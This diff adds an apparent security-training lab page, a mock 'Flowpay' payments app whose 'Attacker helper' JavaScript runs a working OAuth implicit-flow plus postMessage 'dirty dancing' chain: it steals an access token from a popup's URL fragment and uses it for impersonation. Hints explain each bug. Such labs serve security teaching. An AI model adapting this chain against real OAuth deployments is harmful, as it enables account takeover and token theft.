@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Flowpay — Business Payments</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f8fafc;color:#0f172a}
+    .nav{background:#fff;border-bottom:1px solid #e2e8f0;height:56px;display:flex;align-items:center;padding:0 28px;justify-content:space-between}
+    .brand{font-weight:800;font-size:17px;color:#3b82f6;display:flex;align-items:center;gap:8px}
+    .brand .logo{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,#3b82f6,#06b6d4);display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:800}
+    .links{display:flex;gap:22px;font-size:13px}.links a{color:#64748b;text-decoration:none;font-weight:500}.links a.active{color:#3b82f6;border-bottom:2px solid #3b82f6;padding-bottom:18px}
+    .user{display:flex;align-items:center;gap:10px;font-size:13px;color:#64748b}
+    .avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#3b82f6,#06b6d4);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px}
+    .container{max-width:1100px;margin:28px auto;padding:0 24px}
+    h1{font-size:24px;font-weight:800;margin-bottom:4px}.sub{font-size:13px;color:#64748b;margin-bottom:22px}
+    .balance-card{background:linear-gradient(135deg,#3b82f6 0%,#06b6d4 100%);color:#fff;border-radius:14px;padding:28px 30px;margin-bottom:16px}
+    .balance-card .label{font-size:12px;opacity:0.8;text-transform:uppercase;letter-spacing:0.06em}
+    .balance-card .amount{font-size:34px;font-weight:800;margin:6px 0}
+    .balance-card .acct{font-size:12px;font-family:monospace;opacity:0.8}
+    .grid{display:grid;grid-template-columns:2fr 1fr;gap:16px}
+    .card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:22px;margin-bottom:14px}
+    .card h2{font-size:15px;font-weight:700;margin-bottom:4px}.card .note{font-size:12px;color:#94a3b8;margin-bottom:14px}
+    .tx{display:flex;padding:12px 0;border-bottom:1px solid #f1f5f9;font-size:13px;gap:12px;align-items:center}.tx:last-child{border-bottom:none}
+    .tx .icon{width:34px;height:34px;border-radius:8px;background:#f1f5f9;display:flex;align-items:center;justify-content:center;font-size:15px}
+    .tx .who{flex:1}.tx .who .n{font-weight:600}.tx .who .d{font-size:11px;color:#94a3b8}
+    .tx .amt{font-weight:700;font-variant-numeric:tabular-nums}.tx .amt.neg{color:#dc2626}.tx .amt.pos{color:#16a34a}
+    .btn{padding:9px 16px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:none}.btn-primary{background:#3b82f6;color:#fff}.btn-primary:hover{background:#2563eb}.btn-secondary{background:#f1f5f9;color:#475569;border:1px solid #e2e8f0}.btn-danger{background:#dc2626;color:#fff}
+    #login-wall{position:fixed;inset:0;background:#0f172a;display:flex;align-items:center;justify-content:center;z-index:9999}
+    .lf{background:#fff;padding:36px;border-radius:16px;width:360px}
+    .lf .brand-lg{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+    .lf h2{font-size:20px;color:#0f172a}.lf .sub{font-size:13px;color:#64748b;margin-bottom:18px}
+    .lf input{width:100%;padding:10px 14px;border:1px solid #e2e8f0;border-radius:8px;font-size:14px;margin-bottom:10px}
+    .lf button{width:100%;padding:10px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
+    .lf .tip{font-size:11px;color:#94a3b8;margin-top:10px;text-align:center}
+    .hidden{display:none !important}
+    .link-card{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:14px 18px;display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+    .link-card .n{font-size:13px;font-weight:600}.link-card .d{font-size:11px;color:#94a3b8;margin-top:2px}
+    .attacker-box{border:2px dashed #dc2626;background:#fef2f2}
+    .attacker-box h2{color:#991b1b}
+    pre{background:#0f172a;color:#e2e8f0;padding:12px;border-radius:8px;font-family:'Fira Code',monospace;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+    .kv{font-family:monospace;font-size:11px;color:#475569;word-break:break-all;background:#f8fafc;padding:8px 12px;border-radius:6px;margin-top:8px}
+    .toast{position:fixed;bottom:20px;right:20px;padding:12px 18px;border-radius:10px;font-size:13px;font-weight:500;background:#0f172a;color:#fff;display:none;z-index:500}.toast.show{display:block}
+  </style>
+</head>
+<body>
+
+  <div id="login-wall">
+    <div class="lf">
+      <div class="brand-lg"><div class="logo" style="width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,#3b82f6,#06b6d4);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800">F</div><h2>Flowpay</h2></div>
+      <div class="sub">Business payments platform</div>
+      <input type="text" id="u" placeholder="Username" value="victim">
+      <input type="password" id="p" placeholder="Password" value="password123">
+      <button onclick="doLogin()">Sign In</button>
+      <div class="tip">victim / password123</div>
+    </div>
+  </div>
+
+  <nav class="nav">
+    <div class="brand"><div class="logo">F</div>Flowpay</div>
+    <div class="links">
+      <a href="#" class="active">Overview</a>
+      <a href="#">Transactions</a>
+      <a href="#">Invoices</a>
+      <a href="#">Integrations</a>
+      <a href="#">Settings</a>
+    </div>
+    <div class="user">
+      <span id="nav-name">—</span>
+      <div class="avatar" id="nav-av">?</div>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h1>Good morning, <span id="hello">user</span></h1>
+    <div class="sub">Here's your business activity</div>
+
+    <div class="balance-card">
+      <div class="label">Available Balance</div>
+      <div class="amount" id="bal">$—</div>
+      <div class="acct">Account: <span id="acct">—</span></div>
+    </div>
+
+    <div class="grid">
+      <div>
+        <div class="card">
+          <h2>Recent Transactions</h2>
+          <div class="note">Last 30 days</div>
+          <div class="tx"><div class="icon">🏢</div><div class="who"><div class="n">Acme Corp</div><div class="d">Incoming · Mar 28</div></div><div class="amt pos">+$5,000.00</div></div>
+          <div class="tx"><div class="icon">⚡</div><div class="who"><div class="n">Electric Co.</div><div class="d">Outgoing · Mar 25</div></div><div class="amt neg">-$120.50</div></div>
+          <div class="tx"><div class="icon">🎬</div><div class="who"><div class="n">Stream Service</div><div class="d">Subscription · Mar 22</div></div><div class="amt neg">-$45.99</div></div>
+          <div class="tx"><div class="icon">💳</div><div class="who"><div class="n">Tech Supplier</div><div class="d">Outgoing · Mar 18</div></div><div class="amt neg">-$1,340.00</div></div>
+        </div>
+
+        <div class="card">
+          <h2>Connect an Integration</h2>
+          <div class="note">Integrations use SSO to request permissions for your account. You'll sign in to the provider and grant access.</div>
+          <div class="link-card">
+            <div><div class="n">🗂 QuickBooks Online</div><div class="d">Sync invoices and transactions</div></div>
+            <button class="btn btn-primary" onclick="connectIntegration('quickbooks')">Connect</button>
+          </div>
+          <div class="link-card">
+            <div><div class="n">📊 Xero Accounting</div><div class="d">Sync your books</div></div>
+            <button class="btn btn-primary" onclick="connectIntegration('xero')">Connect</button>
+          </div>
+          <div class="link-card">
+            <div><div class="n">💬 Slack Notifications</div><div class="d">Get paid alerts in Slack</div></div>
+            <button class="btn btn-primary" onclick="connectIntegration('slack')">Connect</button>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <h2>Status</h2>
+          <div style="font-size:13px;color:#475569;line-height:1.8">
+            <div>Plan: <strong>Business Pro</strong></div>
+            <div>2FA: <strong style="color:#16a34a">Enabled</strong></div>
+            <div>API Keys: <strong>3 active</strong></div>
+            <div id="session-email" style="margin-top:6px;font-size:11px;color:#94a3b8"></div>
+          </div>
+        </div>
+        <div class="card">
+          <h2>Quick Actions</h2>
+          <button class="btn btn-secondary" style="width:100%;margin-bottom:6px">Send payment</button>
+          <button class="btn btn-secondary" style="width:100%;margin-bottom:6px">Request funds</button>
+          <button class="btn btn-secondary" style="width:100%" onclick="showAttacker()">🧪 Attacker helper (lab)</button>
+        </div>
+
+        <div class="card attacker-box" id="attacker-box" style="display:none">
+          <h2>🧪 Attacker helper</h2>
+          <div class="note" style="color:#7f1d1d">Runs the dirty dancing chain against the current browser session. In a real attack everything runs on the attacker's server.</div>
+
+          <p style="font-size:12px;color:#7f1d1d;margin-bottom:6px"><strong>1.</strong> Build the OAuth implicit-flow URL. The app uses SSO; <code>response_type=token</code> is accepted; <code>redirect_uri</code> validation is prefix-only.</p>
+          <pre id="malicious-url"></pre>
+
+          <p style="font-size:12px;color:#7f1d1d;margin:10px 0 6px"><strong>2.</strong> Open the URL in a popup. Victim auto-approves. Popup lands on <code>/flowpay/sso-complete#access_token=...</code>, which has an analytics postMessage responder.</p>
+
+          <p style="font-size:12px;color:#7f1d1d;margin:10px 0 6px"><strong>3.</strong> Query the popup via <code>postMessage</code> — gadget returns <code>location.href</code> including the fragment.</p>
+
+          <button class="btn btn-danger" style="width:100%" onclick="fireDirtyDancing()">Fire dirty-dancing chain</button>
+
+          <div id="dd-log" class="kv" style="max-height:260px;overflow-y:auto;display:none;margin-top:10px;white-space:pre-wrap"></div>
+
+          <div id="stolen" class="kv" style="display:none;background:#fef2f2;border:1px solid #fecaca;color:#7f1d1d;margin-top:8px"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    var session = null;
+
+    function t(msg) { var el = document.getElementById('toast'); el.className = 'toast show'; el.textContent = msg; setTimeout(function(){ el.className = 'toast'; }, 3000); }
+
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({
+          username: document.getElementById('u').value,
+          password: document.getElementById('p').value
+        })
+      }).then(function(r){ return r.json(); }).then(function(d){
+        if (d.success) init();
+      });
+    }
+
+    function init() {
+      fetch('/flowpay/me', { credentials: 'include' }).then(function(r){
+        if (!r.ok) { document.getElementById('login-wall').classList.remove('hidden'); return Promise.reject(); }
+        return r.json();
+      }).then(function(d){
+        session = d;
+        document.getElementById('login-wall').classList.add('hidden');
+        document.getElementById('nav-name').textContent = d.user.username;
+        document.getElementById('nav-av').textContent = d.user.username[0].toUpperCase();
+        document.getElementById('hello').textContent = d.user.username;
+        document.getElementById('bal').textContent = '$' + d.balance.toLocaleString();
+        document.getElementById('acct').textContent = d.accountId;
+        document.getElementById('session-email').textContent = 'email: ' + d.user.email;
+        buildUrl();
+      }).catch(function(){});
+    }
+
+    function connectIntegration(name) {
+      // Legitimate flow uses the app's own SSO (implicit flow accepted)
+      var url = '/oauth/authorize?client_id=vuln-app&response_type=code&redirect_uri=/flowpay/sso-complete&state=' + Math.random().toString(36).substring(2) + '&scope=read&integration=' + name;
+      window.open(url, 'flowpay-sso', 'width=480,height=600');
+    }
+
+    function showAttacker() {
+      document.getElementById('attacker-box').style.display = 'block';
+    }
+
+    function buildUrl() {
+      // The malicious URL uses response_type=token (implicit) and redirects to
+      // /flowpay/sso-complete — an app page with a postMessage analytics responder.
+      var u = location.origin + '/oauth/authorize' +
+        '?client_id=vuln-app' +
+        '&response_type=token' +      // implicit → token in fragment
+        '&redirect_uri=' + encodeURIComponent(location.origin + '/flowpay/sso-complete') +
+        '&state=dancing' +
+        '&scope=read+write';
+      document.getElementById('malicious-url').textContent = u;
+    }
+
+    function ddLog(msg, color) {
+      var el = document.getElementById('dd-log');
+      el.style.display = 'block';
+      var line = document.createElement('div');
+      if (color) line.style.color = color;
+      line.textContent = '> ' + msg;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+
+    async function fireDirtyDancing() {
+      document.getElementById('dd-log').innerHTML = '';
+      document.getElementById('dd-log').style.display = 'block';
+      document.getElementById('stolen').style.display = 'none';
+
+      if (!session) { ddLog('No session — login first', '#dc2626'); return; }
+
+      var maliciousUrl = document.getElementById('malicious-url').textContent;
+      ddLog('[1] Open implicit-flow OAuth URL in popup', '#3b82f6');
+
+      var popup = window.open(maliciousUrl, 'dd-popup', 'width=500,height=600');
+      if (!popup) { ddLog('Popup blocked — allow popups for this origin', '#dc2626'); return; }
+
+      ddLog('    popup opened; victim auto-approves (no consent needed for trusted app)', '#16a34a');
+
+      // Listen for the gadget's response
+      var gotUrl = null;
+      var handler = function(ev) {
+        if (ev.data && (ev.data.type === 'flowpay:sso-done' || ev.data.type === 'flowpay:analytics') && ev.data.url) {
+          gotUrl = ev.data.url;
+          ddLog('[3] Received gadget response via postMessage:', '#f59e0b');
+          ddLog('    ' + ev.data.url.substring(0, 160), '#f59e0b');
+        }
+      };
+      window.addEventListener('message', handler);
+
+      // Poll: ping the popup until we get a response
+      ddLog('[2] Poll postMessage gadget to extract location.href', '#3b82f6');
+      var attempts = 0;
+      while (!gotUrl && attempts < 40) {
+        try { popup.postMessage({ type: 'getAnalytics' }, '*'); } catch(e) {}
+        await new Promise(function(r){ setTimeout(r, 250); });
+        attempts++;
+      }
+      window.removeEventListener('message', handler);
+      try { popup.close(); } catch(e) {}
+
+      if (!gotUrl) { ddLog('    Gadget never responded', '#dc2626'); return; }
+
+      ddLog('[4] Parse fragment for access_token', '#3b82f6');
+      var m = gotUrl.match(/access_token=([^&]+)/);
+      if (!m) { ddLog('    No token in URL (fragment missing?)', '#dc2626'); return; }
+      var token = m[1];
+      ddLog('    token extracted: ' + token, '#dc2626');
+
+      // Use token against userinfo to prove impersonation
+      ddLog('[5] Prove impersonation via /oauth/userinfo', '#3b82f6');
+      var info = await fetch('/oauth/userinfo', { headers: { 'Authorization': 'Bearer ' + token } }).then(function(r){ return r.json(); });
+      ddLog('    userinfo: ' + JSON.stringify(info), '#dc2626');
+
+      var sbox = document.getElementById('stolen');
+      sbox.style.display = 'block';
+      sbox.innerHTML =
+        '<div style="font-weight:700;margin-bottom:6px">STOLEN TOKEN + ACCOUNT</div>' +
+        '<div>token: ' + token + '</div>' +
+        '<div>identity: ' + JSON.stringify(info) + '</div>';
+
+      ddLog('', '#dc2626');
+      ddLog('*** DIRTY DANCING COMPLETE — postMessage gadget leaked token via opener ***', '#dc2626');
+
+      if (typeof solveLab === 'function') solveLab('chain-dirty-dancing');
+    }
+
+    init();
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: OAuth Dirty Dancing + PostMessage Leak</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">Three small decisions combine into a token theft: implicit flow, a callback page with a friendly analytics handler, and <code>window.opener</code> access. The attacker "dances" between the flow and the callback to pick up the token.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Find the bugs</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <strong>Bug A</strong> — the OAuth server accepts <code>response_type=token</code> (implicit). Token lands in the URL fragment.<br>
+          <strong>Bug B</strong> — the callback page (<code>/flowpay/sso-complete</code>) installed a friendly analytics handler that responds to <code>getAnalytics</code> postMessage with <code>location.href</code>. Any caller can query it.<br>
+          <strong>Bug C</strong> — the callback also proactively sends <code>location.href</code> to <code>window.opener</code> via <code>postMessage("*")</code> so the opener always gets the URL.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>Why the token ends up readable</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          With implicit flow, the browser redirects to <code>/flowpay/sso-complete#access_token=eyJ...</code>. The fragment stays in <code>location.href</code>. When the callback posts that URL back to the opener, everything after <code>#</code> comes with it.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>Build the malicious URL</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <pre><code>/oauth/authorize?client_id=vuln-app&amp;
+response_type=token&amp;
+redirect_uri=/flowpay/sso-complete&amp;
+state=dancing&amp;scope=read+write</code></pre>
+          Open this in a popup via <code>window.open</code>. The victim is logged in → OAuth auto-approves → popup navigates to sso-complete with the token in the fragment.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Collect the token</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Two ways:
+          <ul style="margin:6px 0 6px 18px;font-size:13px">
+            <li>Listen for <code>window.addEventListener('message', ...)</code> — the callback proactively sends <code>{type:'flowpay:sso-done', url: ...}</code> to opener.</li>
+            <li>Actively query: <code>popup.postMessage({type:'getAnalytics'}, '*')</code> — gadget replies with <code>{type:'flowpay:analytics', url: ...}</code>.</li>
+          </ul>
+          Parse <code>access_token=</code> from the URL fragment. Done.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Run the automated chain</button>
+        <div class="hint-spoiler-content">
+          <p>Open the attacker helper and click "Fire dirty-dancing chain". The page:</p>
+          <ul style="margin:6px 0 6px 18px;font-size:13px">
+            <li>Opens the malicious URL in a popup</li>
+            <li>Polls it with <code>postMessage({type:'getAnalytics'})</code></li>
+            <li>Receives the response with <code>location.href</code> including <code>#access_token=...</code></li>
+            <li>Extracts the token and calls <code>/oauth/userinfo</code> to prove impersonation</li>
+          </ul>
+          <p>You'll see the stolen token and victim identity in the red box. Lab solved.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('chain-dirty-dancing', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
